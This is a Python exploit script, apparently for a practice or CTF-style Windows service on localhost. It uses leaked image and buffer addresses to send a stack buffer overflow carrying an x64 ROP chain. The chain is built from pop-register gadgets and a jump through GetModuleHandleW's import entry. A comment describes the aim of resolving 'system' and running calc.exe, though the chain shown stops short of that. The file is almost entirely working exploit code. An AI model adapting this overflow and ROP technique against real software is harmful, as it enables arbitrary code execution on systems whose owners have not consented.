#!/usr/bin/env python3
import socket
import struct
from enum import IntEnum

IP_ADDR = "127.0.0.1"
PORT = 51234


class Offsets(IntEnum):
    Close = 0x17EA
    GetProcAddress = 0x134F
    GetModuleHandleW = 0x130A
    AddrOfGetModuleHandleW = 0x3030


class Gadgets(IntEnum):
    Ret = 0x1001
    PopRcxRet = 0x1006
    PopRdxRet = 0x1004
    PopR8Ret = 0x1008
    PopR9Ret = 0x100B
    PopRaxRet = 0x100E

    PushRaxRet = 0x1010

    JmpDerefRax = 0x1016


def exp():
    with socket.socket() as sock:
        sock.connect((IP_ADDR, PORT))
        r = sock.recv(8)
        imageBase = struct.unpack("P", r)[0]
        print(f"Image Base: {hex(imageBase)}")

        r = sock.recv(8)
        bufAddr = struct.unpack("P", r)[0]
        print(f"Buffer Adr: {hex(bufAddr)}")

        print("Sending Buffer")
        moduleNameW = "Ws2_32.dll\x00".encode("utf-16-le")
        totalLen = 2048
        offset = 1592

        """
        hMod = GetModuleHandleW(L"ucrtbase.dll")
        FARPROC pFunc = GetProcAddress(hMod, "system")
        pFunc("calc.exe")
        """

        s = b"q"
        s += b"\x00" * (64 - len(s))  # Align next string
        stroff = len(s)
        while ((bufAddr + stroff) % 16) != 0:
            s += b"\x00"
            stroff += 1

        # DLL Name
        s += struct.pack(f"<{len(moduleNameW)}s", moduleNameW)

        # Fill to overflow
        s += b"\x41" * (offset - len(s))

        """
        Get address of GetModuleHandle from IAT.
        RAX = &GetModuleHandleW
        """
        s += struct.pack("<Q", imageBase + Gadgets.PopRaxRet)
        s += struct.pack("<Q", imageBase + Offsets.AddrOfGetModuleHandleW)

        """
        Put string in RCX, call GMHW().
        RCX = &moduleNameW
        GetModuleHandleW()
        """
        s += struct.pack("<Q", imageBase +
                         Gadgets.PopRcxRet)  # Set RCX to hold string
        # Put address of string on stack for ^
        s += struct.pack("<Q", bufAddr + stroff)
        s += struct.pack("<Q", imageBase + Gadgets.JmpDerefRax)  # Call/jmp
        # s += b"A" * 8

        # Pad rest
        s += b"\x41" * (totalLen - len(s))

        sock.send(s)
        print(sock.recv(2048).hex())


if __name__ == "__main__":
    exp()
